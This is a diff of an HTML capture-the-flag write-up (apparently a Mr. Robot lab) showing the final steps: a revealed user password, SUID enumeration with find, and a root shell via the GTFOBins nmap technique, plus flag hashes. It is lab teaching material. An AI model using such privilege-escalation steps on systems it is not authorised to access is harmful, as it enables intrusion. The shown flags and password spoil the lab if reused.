@@ -493,16 +493,19 @@
     Password: abcdefghijklmnopqrstuvwxyz
     
     robot@linux:~$ 
+
 </code></pre>
 <p>After login as user robot we can read  key-2-of-3.txt:</p>
 <pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
     robot@linux:~$ cat key-2-of-3.txt
     cat key-2-of-3.txt
     822c73956184f694993bede3eb39f959
+
 </code></pre>
 <p>After that we use this command to see which files works with root privileges:</p>
 <div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     find / -perm -u=s -type f 2&gt;/dev/null
+
 </code></pre></div>
 <p>And then we see there is something interesting. Nmap runs with root privileges:</p>
 <pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
@@ -525,6 +528,7 @@
     /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
     /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
     /usr/lib/pt_chown
+
 </code></pre>
 <p>For to get a root shell with  nmap we go to the <a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a> and then we use this commands from the site to get a root shell:</p>
 <p><img src="pics/M8.png" alt=""></p>
@@ -539,6 +543,7 @@
     # whoami
     whoami
     root
+
 </code></pre>
 <p>We see it worked. We got a root shell. So we make final moves to finish this room:</p>
 <pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
@@ -559,5 +564,6 @@
     # cat key-3-of-3.txt
     cat key-3-of-3.txt
     04787ddef27c3dee1ee161b21670b4e4
+
 </code></pre>
 <p>And done, we got our final flag. Thanks for reading!</p>
